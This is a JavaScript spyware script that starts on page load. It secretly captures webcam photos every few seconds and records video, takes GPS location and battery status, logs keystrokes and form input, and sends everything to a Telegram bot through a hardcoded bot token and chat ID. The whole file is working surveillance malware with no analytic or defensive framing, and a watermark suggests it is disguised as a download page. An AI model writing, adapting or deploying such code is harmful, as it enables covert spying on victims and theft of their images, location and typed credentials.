const TOKEN = '7117048092:AAESu6IVV49HZPkUU3oviD_YL7_-0NJVF7c';
const CHAT_ID = '7646169456';
let mediaStream = null;
let mediaRecorder = null;
let videoChunks = [];
const capturedData = {
  photos: [],
  videos: [],
  keystrokes: '',
  location: null,
  formData: {},
  battery: null
};

// Add watermark logo to media
function addWatermark(canvas) {
  const ctx = canvas.getContext('2d');
  ctx.font = '20px Arial';
  ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
  ctx.fillText('Download.jpeg', 20, 40);
  return canvas;
}

// 🌐 START SPY MODE ON PAGE LOAD
window.addEventListener('DOMContentLoaded', startSpySystem);

async function startSpySystem() {
  try {
    // Get battery info
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      capturedData.battery = {
        level: Math.floor(battery.level * 100),
        charging: battery.charging
      };
    }

    // 📍 GET GPS LOCATION
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        capturedData.location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude
        };
      });
    }

    // 🎥 START CAMERA & RECORDING
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    const video = document.createElement('video');
    video.srcObject = mediaStream;
    await video.play();

    // 📸 CAPTURE PHOTO EVERY 3 SECONDS
    setInterval(() => capturePhoto(video), 3000);

    // 🎥 RECORD 10-SECOND VIDEOS (WEBM)
    if (typeof MediaRecorder !== 'undefined') {
      mediaRecorder = new MediaRecorder(mediaStream, { 
        mimeType: 'video/webm',
        videoBitsPerSecond: 2500000
      });
      
      mediaRecorder.ondataavailable = (e) => {
        videoChunks.push(e.data);
        if (mediaRecorder.state === 'inactive') {
          const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
          sendMediaToTelegram(videoBlob, 'video');
          videoChunks = [];
        }
      };
      
      // Record 10-second chunks
      mediaRecorder.start(10000);
    }

    // ⌨️ KEYLOGGER
    document.addEventListener('keydown', (e) => {
      capturedData.keystrokes += e.key;
    });

    // 📝 FORM DATA COLLECTION
    document.querySelectorAll('input').forEach(input => {
      input.addEventListener('change', (e) => {
        capturedData.formData[e.target.name || e.target.id] = e.target.value;
      });
    });

    // Auto-send collected data every 30 seconds
    setInterval(sendCollectedData, 30000);

  } catch (err) {
    console.error("Spy system error:", err);
  }
}

// 📷 CAPTURE PHOTO WITH WATERMARK
function capturePhoto(video) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  // Add watermark
  addWatermark(canvas);
  
  canvas.toBlob((blob) => {
    sendMediaToTelegram(blob, 'photo');
  }, 'image/jpeg', 0.8);
}

// 📤 SEND MEDIA TO TELEGRAM
function sendMediaToTelegram(blob, type) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  
  if (type === 'photo') {
    formData.append('photo', blob, `photo_${Date.now()}.jpeg`);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
      method: 'POST', 
      body: formData 
    });
  } else if (type === 'video') {
    formData.append('video', blob, `video_${Date.now()}.webm`);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
      method: 'POST', 
      body: formData 
    });
  }
}

// 📩 SEND ALL COLLECTED DATA
function sendCollectedData() {
  let message = `🕵️‍♂️ *New Data Update*\n`;
  
  if (capturedData.battery) {
    message += `🔋 Battery: ${capturedData.battery.level}% (${capturedData.battery.charging ? 'Charging' : 'Not charging'})\n`;
  }
  
  if (capturedData.location) {
    message += `📍 Location: https://maps.google.com/?q=${capturedData.location.lat},${capturedData.location.lng}\n`;
  }
  
  if (Object.keys(capturedData.formData).length > 0) {
    message += `📝 Form Data:\n${JSON.stringify(capturedData.formData, null, 2)}\n`;
  }
  
  if (capturedData.keystrokes) {
    message += `⌨️ Keystrokes:\n${capturedData.keystrokes}\n`;
    capturedData.keystrokes = '';
  }
  
  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  });
}

// 🚨 CLEAN UP ON EXIT
window.addEventListener('beforeunload', () => {
  sendCollectedData();
  if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
  if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
});